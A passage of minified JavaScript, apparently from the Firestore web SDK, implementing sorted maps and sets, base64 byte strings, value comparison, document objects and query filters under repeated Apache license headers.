 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const t_=-1;function ap(t){return t==null}function mm(t){return t===0&&1/t==-1/0}function zP(t){return typeof t=="number"&&Number.isInteger(t)&&!mm(t)&&t<=Number.MAX_SAFE_INTEGER&&t>=Number.MIN_SAFE_INTEGER}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ZC="";function FP(t){let e="";for(let n=0;n<t.length;n++)e.length>0&&(e=aA(e)),e=HP(t.get(n),e);return aA(e)}function HP(t,e){let n=e;const i=t.length;for(let s=0;s<i;s++){const o=t.charAt(s);switch(o){case"\0":n+="";break;case ZC:n+="";break;default:n+=o}}return n}function aA(t){return t+ZC+""}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function oA(t){let e=0;for(const n in t)Object.prototype.hasOwnProperty.call(t,n)&&e++;return e}function Xa(t,e){for(const n in t)Object.prototype.hasOwnProperty.call(t,n)&&e(n,t[n])}function JC(t){for(const e in t)if(Object.prototype.hasOwnProperty.call(t,e))return!1;return!0}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let un=class L0{constructor(e,n){this.comparator=e,this.root=n||ja.EMPTY}insert(e,n){return new L0(this.comparator,this.root.insert(e,n,this.comparator).copy(null,null,ja.BLACK,null,null))}remove(e){return new L0(this.comparator,this.root.remove(e,this.comparator).copy(null,null,ja.BLACK,null,null))}get(e){let n=this.root;for(;!n.isEmpty();){const i=this.comparator(e,n.key);if(i===0)return n.value;i<0?n=n.left:i>0&&(n=n.right)}return null}indexOf(e){let n=0,i=this.root;for(;!i.isEmpty();){const s=this.comparator(e,i.key);if(s===0)return n+i.left.size;s<0?i=i.left:(n+=i.left.size+1,i=i.right)}return-1}isEmpty(){return this.root.isEmpty()}get size(){return this.root.size}minKey(){return this.root.minKey()}maxKey(){return this.root.maxKey()}inorderTraversal(e){return this.root.inorderTraversal(e)}forEach(e){this.inorderTraversal((n,i)=>(e(n,i),!1))}toString(){const e=[];return this.inorderTraversal((n,i)=>(e.push(`${n}:${i}`),!1)),`{${e.join(", ")}}`}reverseTraversal(e){return this.root.reverseTraversal(e)}getIterator(){return new Tf(this.root,null,this.comparator,!1)}getIteratorFrom(e){return new Tf(this.root,e,this.comparator,!1)}getReverseIterator(){return new Tf(this.root,null,this.comparator,!0)}getReverseIteratorFrom(e){return new Tf(this.root,e,this.comparator,!0)}},Tf=class{constructor(e,n,i,s){this.isReverse=s,this.nodeStack=[];let o=1;for(;!e.isEmpty();)if(o=n?i(e.key,n):1,n&&s&&(o*=-1),o<0)e=this.isReverse?e.left:e.right;else{if(o===0){this.nodeStack.push(e);break}this.nodeStack.push(e),e=this.isReverse?e.right:e.left}}getNext(){let e=this.nodeStack.pop();const n={key:e.key,value:e.value};if(this.isReverse)for(e=e.left;!e.isEmpty();)this.nodeStack.push(e),e=e.right;else for(e=e.right;!e.isEmpty();)this.nodeStack.push(e),e=e.left;return n}hasNext(){return this.nodeStack.length>0}peek(){if(this.nodeStack.length===0)return null;const e=this.nodeStack[this.nodeStack.length-1];return{key:e.key,value:e.value}}},ja=class Ns{constructor(e,n,i,s,o){this.key=e,this.value=n,this.color=i??Ns.RED,this.left=s??Ns.EMPTY,this.right=o??Ns.EMPTY,this.size=this.left.size+1+this.right.size}copy(e,n,i,s,o){return new Ns(e??this.key,n??this.value,i??this.color,s??this.left,o??this.right)}isEmpty(){return!1}inorderTraversal(e){return this.left.inorderTraversal(e)||e(this.key,this.value)||this.right.inorderTraversal(e)}reverseTraversal(e){return this.right.reverseTraversal(e)||e(this.key,this.value)||this.left.reverseTraversal(e)}min(){return this.left.isEmpty()?this:this.left.min()}minKey(){return this.min().key}maxKey(){return this.right.isEmpty()?this.key:this.right.maxKey()}insert(e,n,i){let s=this;const o=i(e,s.key);return s=o<0?s.copy(null,null,null,s.left.insert(e,n,i),null):o===0?s.copy(null,n,null,null,null):s.copy(null,null,null,null,s.right.insert(e,n,i)),s.fixUp()}removeMin(){if(this.left.isEmpty())return Ns.EMPTY;let e=this;return e.left.isRed()||e.left.left.isRed()||(e=e.moveRedLeft()),e=e.copy(null,null,null,e.left.removeMin(),null),e.fixUp()}remove(e,n){let i,s=this;if(n(e,s.key)<0)s.left.isEmpty()||s.left.isRed()||s.left.left.isRed()||(s=s.moveRedLeft()),s=s.copy(null,null,null,s.left.remove(e,n),null);else{if(s.left.isRed()&&(s=s.rotateRight()),s.right.isEmpty()||s.right.isRed()||s.right.left.isRed()||(s=s.moveRedRight()),n(e,s.key)===0){if(s.right.isEmpty())return Ns.EMPTY;i=s.right.min(),s=s.copy(i.key,i.value,null,null,s.right.removeMin())}s=s.copy(null,null,null,null,s.right.remove(e,n))}return s.fixUp()}isRed(){return this.color}fixUp(){let e=this;return e.right.isRed()&&!e.left.isRed()&&(e=e.rotateLeft()),e.left.isRed()&&e.left.left.isRed()&&(e=e.rotateRight()),e.left.isRed()&&e.right.isRed()&&(e=e.colorFlip()),e}moveRedLeft(){let e=this.colorFlip();return e.right.left.isRed()&&(e=e.copy(null,null,null,null,e.right.rotateRight()),e=e.rotateLeft(),e=e.colorFlip()),e}moveRedRight(){let e=this.colorFlip();return e.left.left.isRed()&&(e=e.rotateRight(),e=e.colorFlip()),e}rotateLeft(){const e=this.copy(null,null,Ns.RED,null,this.right.left);return this.right.copy(null,null,this.color,e,null)}rotateRight(){const e=this.copy(null,null,Ns.RED,this.left.right,null);return this.left.copy(null,null,this.color,null,e)}colorFlip(){const e=this.left.copy(null,null,!this.left.color,null,null),n=this.right.copy(null,null,!this.right.color,null,null);return this.copy(null,null,!this.color,e,n)}checkMaxDepth(){const e=this.check();return Math.pow(2,e)<=this.size+1}check(){if(this.isRed()&&this.left.isRed())throw ze(43730,{key:this.key,value:this.value});if(this.right.isRed())throw ze(14113,{key:this.key,value:this.value});const e=this.left.check();if(e!==this.right.check())throw ze(27949);return e+(this.isRed()?0:1)}};ja.EMPTY=null,ja.RED=!0,ja.BLACK=!1;ja.EMPTY=new class{constructor(){this.size=0}get key(){throw ze(57766)}get value(){throw ze(16141)}get color(){throw ze(16727)}get left(){throw ze(29726)}get right(){throw ze(36894)}copy(e,n,i,s,o){return this}insert(e,n,i){return new ja(e,n)}remove(e,n){return this}isEmpty(){return!0}inorderTraversal(e){return!1}reverseTraversal(e){return!1}minKey(){return null}maxKey(){return null}isRed(){return!1}checkMaxDepth(){return!0}check(){return 0}};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vn{constructor(e){this.comparator=e,this.data=new un(this.comparator)}has(e){return this.data.get(e)!==null}first(){return this.data.minKey()}last(){return this.data.maxKey()}get size(){return this.data.size}indexOf(e){return this.data.indexOf(e)}forEach(e){this.data.inorderTraversal((n,i)=>(e(n),!1))}forEachInRange(e,n){const i=this.data.getIteratorFrom(e[0]);for(;i.hasNext();){const s=i.getNext();if(this.comparator(s.key,e[1])>=0)return;n(s.key)}}forEachWhile(e,n){let i;for(i=n!==void 0?this.data.getIteratorFrom(n):this.data.getIterator();i.hasNext();)if(!e(i.getNext().key))return}firstAfterOrEqual(e){const n=this.data.getIteratorFrom(e);return n.hasNext()?n.getNext().key:null}getIterator(){return new lA(this.data.getIterator())}getIteratorFrom(e){return new lA(this.data.getIteratorFrom(e))}add(e){return this.copy(this.data.remove(e).insert(e,!0))}delete(e){return this.has(e)?this.copy(this.data.remove(e)):this}isEmpty(){return this.data.isEmpty()}unionWith(e){let n=this;return n.size<e.size&&(n=e,e=this),e.forEach(i=>{n=n.add(i)}),n}isEqual(e){if(!(e instanceof vn)||this.size!==e.size)return!1;const n=this.data.getIterator(),i=e.data.getIterator();for(;n.hasNext();){const s=n.getNext().key,o=i.getNext().key;if(this.comparator(s,o)!==0)return!1}return!0}toArray(){const e=[];return this.forEach(n=>{e.push(n)}),e}toString(){const e=[];return this.forEach(n=>e.push(n)),"SortedSet("+e.toString()+")"}copy(e){const n=new vn(this.comparator);return n.data=e,n}}class lA{constructor(e){this.iter=e}getNext(){return this.iter.getNext().key}hasNext(){return this.iter.hasNext()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ji{constructor(e){this.fields=e,e.sort(Un.comparator)}static empty(){return new ji([])}unionWith(e){let n=new vn(Un.comparator);for(const i of this.fields)n=n.add(i);for(const i of e)n=n.add(i);return new ji(n.toArray())}covers(e){for(const n of this.fields)if(n.isPrefixOf(e))return!0;return!1}isEqual(e){return pc(this.fields,e.fields,(n,i)=>n.isEqual(i))}}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class eS extends Error{constructor(){super(...arguments),this.name="Base64DecodeError"}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Bn{constructor(e){this.binaryString=e}static fromBase64String(e){const n=function(s){try{return atob(s)}catch(o){throw typeof DOMException<"u"&&o instanceof DOMException?new eS("Invalid base64 string: "+o):o}}(e);return new Bn(n)}static fromUint8Array(e){const n=function(s){let o="";for(let c=0;c<s.length;++c)o+=String.fromCharCode(s[c]);return o}(e);return new Bn(n)}[Symbol.iterator](){let e=0;return{next:()=>e<this.binaryString.length?{value:this.binaryString.charCodeAt(e++),done:!1}:{value:void 0,done:!0}}}toBase64(){return function(n){return btoa(n)}(this.binaryString)}toUint8Array(){return function(n){const i=new Uint8Array(n.length);for(let s=0;s<n.length;s++)i[s]=n.charCodeAt(s);return i}(this.binaryString)}approximateByteSize(){return 2*this.binaryString.length}compareTo(e){return Xe(this.binaryString,e.binaryString)}isEqual(e){return this.binaryString===e.binaryString}}Bn.EMPTY_BYTE_STRING=new Bn("");const qP=new RegExp(/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(?:\.(\d+))?Z$/);function Ha(t){if(St(!!t,39018),typeof t=="string"){let e=0;const n=qP.exec(t);if(St(!!n,46558,{timestamp:t}),n[1]){let s=n[1];s=(s+"000000000").substr(0,9),e=Number(s)}const i=new Date(t);return{seconds:Math.floor(i.getTime()/1e3),nanos:e}}return{seconds:en(t.seconds),nanos:en(t.nanos)}}function en(t){return typeof t=="number"?t:typeof t=="string"?Number(t):0}function qa(t){return typeof t=="string"?Bn.fromBase64String(t):Bn.fromUint8Array(t)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const tS="server_timestamp",nS="__type__",iS="__previous_value__",rS="__local_write_time__";function n_(t){var e,n;return((n=(((e=t==null?void 0:t.mapValue)===null||e===void 0?void 0:e.fields)||{})[nS])===null||n===void 0?void 0:n.stringValue)===tS}function op(t){const e=t.mapValue.fields[iS];return n_(e)?op(e):e}function wd(t){const e=Ha(t.mapValue.fields[rS].timestampValue);return new yn(e.seconds,e.nanos)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class GP{constructor(e,n,i,s,o,c,d,f,p,v){this.databaseId=e,this.appId=n,this.persistenceKey=i,this.host=s,this.ssl=o,this.forceLongPolling=c,this.autoDetectLongPolling=d,this.longPollingOptions=f,this.useFetchStreams=p,this.isUsingEmulator=v}}const pm="(default)";class bd{constructor(e,n){this.projectId=e,this.database=n||pm}static empty(){return new bd("","")}get isDefaultDatabase(){return this.database===pm}isEqual(e){return e instanceof bd&&e.projectId===this.projectId&&e.database===this.database}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const sS="__type__",YP="__max__",Cf={mapValue:{}},aS="__vector__",gm="value";function Ga(t){return"nullValue"in t?0:"booleanValue"in t?1:"integerValue"in t||"doubleValue"in t?2:"timestampValue"in t?3:"stringValue"in t?5:"bytesValue"in t?6:"referenceValue"in t?7:"geoPointValue"in t?8:"arrayValue"in t?9:"mapValue"in t?n_(t)?4:KP(t)?9007199254740991:QP(t)?10:11:ze(28295,{value:t})}function Jr(t,e){if(t===e)return!0;const n=Ga(t);if(n!==Ga(e))return!1;switch(n){case 0:case 9007199254740991:return!0;case 1:return t.booleanValue===e.booleanValue;case 4:return wd(t).isEqual(wd(e));case 3:return function(s,o){if(typeof s.timestampValue=="string"&&typeof o.timestampValue=="string"&&s.timestampValue.length===o.timestampValue.length)return s.timestampValue===o.timestampValue;const c=Ha(s.timestampValue),d=Ha(o.timestampValue);return c.seconds===d.seconds&&c.nanos===d.nanos}(t,e);case 5:return t.stringValue===e.stringValue;case 6:return function(s,o){return qa(s.bytesValue).isEqual(qa(o.bytesValue))}(t,e);case 7:return t.referenceValue===e.referenceValue;case 8:return function(s,o){return en(s.geoPointValue.latitude)===en(o.geoPointValue.latitude)&&en(s.geoPointValue.longitude)===en(o.geoPointValue.longitude)}(t,e);case 2:return function(s,o){if("integerValue"in s&&"integerValue"in o)return en(s.integerValue)===en(o.integerValue);if("doubleValue"in s&&"doubleValue"in o){const c=en(s.doubleValue),d=en(o.doubleValue);return c===d?mm(c)===mm(d):isNaN(c)&&isNaN(d)}return!1}(t,e);case 9:return pc(t.arrayValue.values||[],e.arrayValue.values||[],Jr);case 10:case 11:return function(s,o){const c=s.mapValue.fields||{},d=o.mapValue.fields||{};if(oA(c)!==oA(d))return!1;for(const f in c)if(c.hasOwnProperty(f)&&(d[f]===void 0||!Jr(c[f],d[f])))return!1;return!0}(t,e);default:return ze(52216,{left:t})}}function xd(t,e){return(t.values||[]).find(n=>Jr(n,e))!==void 0}function gc(t,e){if(t===e)return 0;const n=Ga(t),i=Ga(e);if(n!==i)return Xe(n,i);switch(n){case 0:case 9007199254740991:return 0;case 1:return Xe(t.booleanValue,e.booleanValue);case 2:return function(o,c){const d=en(o.integerValue||o.doubleValue),f=en(c.integerValue||c.doubleValue);return d<f?-1:d>f?1:d===f?0:isNaN(d)?isNaN(f)?0:-1:1}(t,e);case 3:return cA(t.timestampValue,e.timestampValue);case 4:return cA(wd(t),wd(e));case 5:return j0(t.stringValue,e.stringValue);case 6:return function(o,c){const d=qa(o),f=qa(c);return d.compareTo(f)}(t.bytesValue,e.bytesValue);case 7:return function(o,c){const d=o.split("/"),f=c.split("/");for(let p=0;p<d.length&&p<f.length;p++){const v=Xe(d[p],f[p]);if(v!==0)return v}return Xe(d.length,f.length)}(t.referenceValue,e.referenceValue);case 8:return function(o,c){const d=Xe(en(o.latitude),en(c.latitude));return d!==0?d:Xe(en(o.longitude),en(c.longitude))}(t.geoPointValue,e.geoPointValue);case 9:return uA(t.arrayValue,e.arrayValue);case 10:return function(o,c){var d,f,p,v;const b=o.fields||{},w=c.fields||{},E=(d=b[gm])===null||d===void 0?void 0:d.arrayValue,C=(f=w[gm])===null||f===void 0?void 0:f.arrayValue,M=Xe(((p=E==null?void 0:E.values)===null||p===void 0?void 0:p.length)||0,((v=C==null?void 0:C.values)===null||v===void 0?void 0:v.length)||0);return M!==0?M:uA(E,C)}(t.mapValue,e.mapValue);case 11:return function(o,c){if(o===Cf.mapValue&&c===Cf.mapValue)return 0;if(o===Cf.mapValue)return 1;if(c===Cf.mapValue)return-1;const d=o.fields||{},f=Object.keys(d),p=c.fields||{},v=Object.keys(p);f.sort(),v.sort();for(let b=0;b<f.length&&b<v.length;++b){const w=j0(f[b],v[b]);if(w!==0)return w;const E=gc(d[f[b]],p[v[b]]);if(E!==0)return E}return Xe(f.length,v.length)}(t.mapValue,e.mapValue);default:throw ze(23264,{Pe:n})}}function cA(t,e){if(typeof t=="string"&&typeof e=="string"&&t.length===e.length)return Xe(t,e);const n=Ha(t),i=Ha(e),s=Xe(n.seconds,i.seconds);return s!==0?s:Xe(n.nanos,i.nanos)}function uA(t,e){const n=t.values||[],i=e.values||[];for(let s=0;s<n.length&&s<i.length;++s){const o=gc(n[s],i[s]);if(o)return o}return Xe(n.length,i.length)}function yc(t){return V0(t)}function V0(t){return"nullValue"in t?"null":"booleanValue"in t?""+t.booleanValue:"integerValue"in t?""+t.integerValue:"doubleValue"in t?""+t.doubleValue:"timestampValue"in t?function(n){const i=Ha(n);return`time(${i.seconds},${i.nanos})`}(t.timestampValue):"stringValue"in t?t.stringValue:"bytesValue"in t?function(n){return qa(n).toBase64()}(t.bytesValue):"referenceValue"in t?function(n){return Pe.fromName(n).toString()}(t.referenceValue):"geoPointValue"in t?function(n){return`geo(${n.latitude},${n.longitude})`}(t.geoPointValue):"arrayValue"in t?function(n){let i="[",s=!0;for(const o of n.values||[])s?s=!1:i+=",",i+=V0(o);return i+"]"}(t.arrayValue):"mapValue"in t?function(n){const i=Object.keys(n.fields||{}).sort();let s="{",o=!0;for(const c of i)o?o=!1:s+=",",s+=`${c}:${V0(n.fields[c])}`;return s+"}"}(t.mapValue):ze(61005,{value:t})}function Vf(t){switch(Ga(t)){case 0:case 1:return 4;case 2:return 8;case 3:case 8:return 16;case 4:const e=op(t);return e?16+Vf(e):16;case 5:return 2*t.stringValue.length;case 6:return qa(t.bytesValue).approximateByteSize();case 7:return t.referenceValue.length;case 9:return function(i){return(i.values||[]).reduce((s,o)=>s+Vf(o),0)}(t.arrayValue);case 10:case 11:return function(i){let s=0;return Xa(i.fields,(o,c)=>{s+=o.length+Vf(c)}),s}(t.mapValue);default:throw ze(13486,{value:t})}}function U0(t){return!!t&&"integerValue"in t}function i_(t){return!!t&&"arrayValue"in t}function dA(t){return!!t&&"nullValue"in t}function hA(t){return!!t&&"doubleValue"in t&&isNaN(Number(t.doubleValue))}function Uf(t){return!!t&&"mapValue"in t}function QP(t){var e,n;return((n=(((e=t==null?void 0:t.mapValue)===null||e===void 0?void 0:e.fields)||{})[sS])===null||n===void 0?void 0:n.stringValue)===aS}function sd(t){if(t.geoPointValue)return{geoPointValue:Object.assign({},t.geoPointValue)};if(t.timestampValue&&typeof t.timestampValue=="object")return{timestampValue:Object.assign({},t.timestampValue)};if(t.mapValue){const e={mapValue:{fields:{}}};return Xa(t.mapValue.fields,(n,i)=>e.mapValue.fields[n]=sd(i)),e}if(t.arrayValue){const e={arrayValue:{values:[]}};for(let n=0;n<(t.arrayValue.values||[]).length;++n)e.arrayValue.values[n]=sd(t.arrayValue.values[n]);return e}return Object.assign({},t)}function KP(t){return(((t.mapValue||{}).fields||{}).__type__||{}).stringValue===YP}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class pi{constructor(e){this.value=e}static empty(){return new pi({mapValue:{}})}field(e){if(e.isEmpty())return this.value;{let n=this.value;for(let i=0;i<e.length-1;++i)if(n=(n.mapValue.fields||{})[e.get(i)],!Uf(n))return null;return n=(n.mapValue.fields||{})[e.lastSegment()],n||null}}set(e,n){this.getFieldsMap(e.popLast())[e.lastSegment()]=sd(n)}setAll(e){let n=Un.emptyPath(),i={},s=[];e.forEach((c,d)=>{if(!n.isImmediateParentOf(d)){const f=this.getFieldsMap(n);this.applyChanges(f,i,s),i={},s=[],n=d.popLast()}c?i[d.lastSegment()]=sd(c):s.push(d.lastSegment())});const o=this.getFieldsMap(n);this.applyChanges(o,i,s)}delete(e){const n=this.field(e.popLast());Uf(n)&&n.mapValue.fields&&delete n.mapValue.fields[e.lastSegment()]}isEqual(e){return Jr(this.value,e.value)}getFieldsMap(e){let n=this.value;n.mapValue.fields||(n.mapValue={fields:{}});for(let i=0;i<e.length;++i){let s=n.mapValue.fields[e.get(i)];Uf(s)&&s.mapValue.fields||(s={mapValue:{fields:{}}},n.mapValue.fields[e.get(i)]=s),n=s}return n.mapValue.fields}applyChanges(e,n,i){Xa(n,(s,o)=>e[s]=o);for(const s of i)delete e[s]}clone(){return new pi(sd(this.value))}}function oS(t){const e=[];return Xa(t.fields,(n,i)=>{const s=new Un([n]);if(Uf(i)){const o=oS(i.mapValue).fields;if(o.length===0)e.push(s);else for(const c of o)e.push(s.child(c))}else e.push(s)}),new ji(e)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Wn{constructor(e,n,i,s,o,c,d){this.key=e,this.documentType=n,this.version=i,this.readTime=s,this.createTime=o,this.data=c,this.documentState=d}static newInvalidDocument(e){return new Wn(e,0,Ye.min(),Ye.min(),Ye.min(),pi.empty(),0)}static newFoundDocument(e,n,i,s){return new Wn(e,1,n,Ye.min(),i,s,0)}static newNoDocument(e,n){return new Wn(e,2,n,Ye.min(),Ye.min(),pi.empty(),0)}static newUnknownDocument(e,n){return new Wn(e,3,n,Ye.min(),Ye.min(),pi.empty(),2)}convertToFoundDocument(e,n){return!this.createTime.isEqual(Ye.min())||this.documentType!==2&&this.documentType!==0||(this.createTime=e),this.version=e,this.documentType=1,this.data=n,this.documentState=0,this}convertToNoDocument(e){return this.version=e,this.documentType=2,this.data=pi.empty(),this.documentState=0,this}convertToUnknownDocument(e){return this.version=e,this.documentType=3,this.data=pi.empty(),this.documentState=2,this}setHasCommittedMutations(){return this.documentState=2,this}setHasLocalMutations(){return this.documentState=1,this.version=Ye.min(),this}setReadTime(e){return this.readTime=e,this}get hasLocalMutations(){return this.documentState===1}get hasCommittedMutations(){return this.documentState===2}get hasPendingWrites(){return this.hasLocalMutations||this.hasCommittedMutations}isValidDocument(){return this.documentType!==0}isFoundDocument(){return this.documentType===1}isNoDocument(){return this.documentType===2}isUnknownDocument(){return this.documentType===3}isEqual(e){return e instanceof Wn&&this.key.isEqual(e.key)&&this.version.isEqual(e.version)&&this.documentType===e.documentType&&this.documentState===e.documentState&&this.data.isEqual(e.data)}mutableCopy(){return new Wn(this.key,this.documentType,this.version,this.readTime,this.createTime,this.data.clone(),this.documentState)}toString(){return`Document(${this.key}, ${this.version}, ${JSON.stringify(this.data.value)}, {createTime: ${this.createTime}}), {documentType: ${this.documentType}}), {documentState: ${this.documentState}})`}}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ym{constructor(e,n){this.position=e,this.inclusive=n}}function fA(t,e,n){let i=0;for(let s=0;s<t.position.length;s++){const o=e[s],c=t.position[s];if(o.field.isKeyField()?i=Pe.comparator(Pe.fromName(c.referenceValue),n.key):i=gc(c,n.data.field(o.field)),o.dir==="desc"&&(i*=-1),i!==0)break}return i}function mA(t,e){if(t===null)return e===null;if(e===null||t.inclusive!==e.inclusive||t.position.length!==e.position.length)return!1;for(let n=0;n<t.position.length;n++)if(!Jr(t.position[n],e.position[n]))return!1;return!0}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vm{constructor(e,n="asc"){this.field=e,this.dir=n}}function WP(t,e){return t.dir===e.dir&&t.field.isEqual(e.field)}/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class lS{}class gn extends lS{constructor(e,n,i){super(),this.field=e,this.op=n,this.value=i}static create(e,n,i){return e.isKeyField()?n==="in"||n==="not-in"?this.createKeyFieldInFilter(e,n,i):new XP(e,n,i):n==="array-contains"?new e8(e,i):n==="in"?new t8(e,i):n==="not-in"?new n8(e,i):n==="array-contains-any"?new i8(e,i):new gn(e,n,i)}static createKeyFieldInFilter(e,n,i){return n==="in"?new ZP(e,i):new JP(e,i)}matches(e){const n=e.data.field(this.field);return this.op==="!="?n!==null&&n.nullValue===void 0&&this.matchesComparison(gc(n,this.value)):n!==null&&Ga(this.value)===Ga(n)&&this.matchesComparison(gc(n,this.value))}matchesComparison(e){switch(this.op){case"<":return e<0;case"<=":return e<=0;case"==":return e===0;case"!=":return e!==0;case">":return e>0;case">=":return e>=0;default:return ze(47266,{operator:this.op})}}isInequality(){return["<","<=",">",">=","!=","not-in"].indexOf(this.op)>=0}getFlattenedFilters(){return[this]}getFilters(){return[this]}}class es extends lS{constructor(e,n){super(),this.filters=e,this.op=n,this.Te=null}static create(e,n){return new es(e,n)}matches(e){return cS(this)?this.filters.find(n=>!n.matches(e))===void 0:this.filters.find(n=>n.matches(e))!==void 